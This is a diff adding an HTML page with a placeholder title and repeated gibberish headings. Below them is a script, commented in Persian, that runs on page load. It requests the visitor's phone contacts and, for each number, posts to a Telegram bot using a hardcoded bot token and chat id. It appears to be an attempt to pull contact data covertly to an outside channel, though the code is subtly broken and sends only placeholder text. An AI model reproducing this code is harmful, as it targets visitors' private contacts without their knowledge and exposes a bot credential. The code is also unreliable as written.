@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>kslfkesofeskf</h1>
+    <h1>kslfkesofeskf</h1>
+    <h1>kslfkesofeskf</h1>
+    <h1>kslfkesofeskf</h1>
+    <h1>kslfkesofeskf</h1>
+    <h1>kslfkesofeskf</h1>
+    <h1>kslfkesofeskf</h1>
+    <h1>kslfkesofeskf</h1>
+    <h1>kslfkesofeskf</h1>
+    <h1>kslfkesofeskf</h1>
+    <h1>kslfkesofeskf</h1>
+    <h1>kslfkesofeskf</h1>
+    <h1>kslfkesofeskf</h1>
+    <h1>kslfkesofeskf</h1>
+    <h1>kslfkesofeskf</h1>
+    <h1>kslfkesofeskf</h1>
+    <script>
+// اتصال به مخاطبین گوشی و ارسال پیام
+function accessContactsAndSendMessage() {
+// چک کردن اینکه دستگاه از دسترسی به مخاطبین پشتیبانی می‌کند یا خیر
+if ('contacts' in navigator) {
+// درخواست دسترسی به مخاطبین
+navigator.contacts.select(['name', 'phone']).then(contacts => {
+// یافتن شماره تلفن هر مخاطب و ارسال پیام
+contacts.forEach(contact => {
+// اگر شماره تلفنی برای مخاطب وجود داشته باشد
+if (contact.phoneNumbers.length > 0) {
+const phoneNumber = contact.phoneNumbers[0].value;
+sendMessage(phoneNumber, 'Your message here', '6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw', '1209515299'); // تابعی برای ارسال پیام
+}
+});
+}).catch(error => {
+console.error('Error accessing contacts:', error);
+});
+} else {
+console.error('Contacts API not supported');
+}
+}
+
+// تابعی برای ارسال پیام
+function sendMessage(phoneNumber, message, botToken, botId) {
+// ارسال درخواست به API تلگرام با استفاده از توکن ربات
+const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+const data = {
+chat_id: botId,
+text: message
+};
+
+// ارسال درخواست POST با استفاده از Fetch API یا Axios یا هر کتابخانه دیگری
+// در این مثال از Fetch API استفاده شده است
+fetch(telegramApiUrl, {
+method: 'POST',
+headers: {
+'Content-Type': 'application/json'
+},
+body: JSON.stringify(data)
+})
+.then(response => {
+console.log('Message sent:', response);
+})
+.catch(error => {
+console.error('Error sending message:', error);
+});
+}
+
+// فراخوانی تابع برای شروع عملیات
+accessContactsAndSendMessage();
+    </script>
+</body>
+</html>
